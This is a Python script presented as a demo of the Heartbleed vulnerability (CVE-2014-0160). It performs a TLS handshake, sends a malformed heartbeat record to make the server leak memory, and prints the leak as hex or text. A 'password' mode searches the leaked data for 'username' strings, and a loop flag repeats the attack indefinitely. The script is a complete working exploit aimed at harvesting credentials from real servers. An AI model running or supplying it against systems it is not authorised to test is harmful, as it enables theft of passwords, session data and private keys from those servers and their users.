#!/bin/python3

# Demo of heartbleed(CVE-2014-0160)
#
# @Author Huang Yuzhong (hyzgog@gmail.com)
# @Reference Jared Stafford (jspenguin@jspenguin.org)
#

import struct
import socket
import time
import codecs
from optparse import OptionParser

decode_hex = codecs.getdecoder('hex_codec')

options = OptionParser(usage='%prog server [options]', description='Demo of heartbleed(CVE-2014-0160)')
options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
options.add_option('-o', '--output', type='string', default='text', help='Output format [password, text, hex] (default: text)')
options.add_option('-l', '--loop', action='store_true', default=False, help='Whether loop forever')
opts, args = options.parse_args()

def h2bin(x):
	return decode_hex(x.replace(' ', '').replace('\n', '').replace('\t', ''))[0]

def debug(*arg):
	if opts.output != 'password':
		print(*arg)

# binary data, copy from web
hello = h2bin('''
	16 03 02 00  dc 01 00 00 d8 03 02 53
	43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
	bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
	00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
	00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
	c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
	c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
	c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
	c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
	00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
	03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
	00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
	00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
	00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
	00 0f 00 01 01                                  
''')

hb = h2bin(''' 
	18 03 02 00 03
	01 40 00
''')

def hexdump(s):
	for b in range(0, len(s), 16):
		lin = [c for c in s[b : b + 16]]
		hxdat = ' '.join('%02X' % c for c in lin)
		pdat = ''.join(chr(c) if 32 <= c <= 126 else '.' for c in lin)
		print( '  %04x: %-48s %s' % (b, hxdat, pdat))

def textdump(s):
	print(''.join(chr(c) for c in s if 32 <= c <= 126 ))

def passdump(s):
	buf = ''.join(chr(c) for c in s if 32 <= c <= 126 )
	left = buf.find('username')
	if left != -1:
		print(buf[left:])

def dump(s):
	if opts.output == 'password':
		passdump(s)
	elif opts.output == 'text':
		textdump(s)
	elif opts.output == 'hex':
		hexdump(s)

def recvall(s, length, timeout=5):
	endtime = time.time() + timeout
	rdata = b''
	remain = length
	while remain > 0:
		rtime = endtime - time.time() 
		if rtime < 0:
			break

		data = s.recv(remain)
		# EOF?
		if not data:
			break
		rdata += data
		remain -= len(data)

	return rdata

def recvmsg(s):
	hdr = recvall(s, 5)
	if hdr is None:
		debug('Unexpected EOF receiving record header - server closed connection')
		return None, None, None
	typ, ver, ln = struct.unpack('>BHH', hdr)
	pay = recvall(s, ln, 10)
	if pay is None:
		debug('Unexpected EOF receiving record payload - server closed connection')
		return None, None, None
	debug(' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)))
	return typ, ver, pay

def hit_hb(s):
	s.send(hb)
	while True:
		typ, ver, pay = recvmsg(s)

		if typ is None:
			debug('No heartbeat response received, server likely not vulnerable')
			return False

		if typ == 24:
			debug('Received heartbeat response:')
			dump(pay)
			if len(pay) > 3:
				debug( 'WARNING: server returned more data than it should - server is vulnerable!')
			else:
				debug( 'Server processed malformed heartbeat, but did not return any extra data.')
			return True

		if typ == 21:
			debug('Received alert:')
			dump(pay)
			debug('Server returned error, likely not vulnerable')
			return False

def main(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	debug('Connecting...')
	s.connect((host, port))

	debug('Sending Client Hello...')
	s.send(hello)

	debug('Waiting for Server Hello...')

	while True:
		typ, ver, pay = recvmsg(s)
		if typ == None:
			debug('Server closed connection without sending Server Hello.')
			return
		# Look for server hello done message.
		if typ == 22 and pay[0] == 0x0E:
			break

	debug('Sending heartbeat request...')
	s.send(hb)
	hit_hb(s)

if __name__ == '__main__':
	if len(args) < 1:
		options.print_help()
	else:
		if opts.loop:
			while True:
				main(args[0], opts.port)
		else:
			main(args[0], opts.port)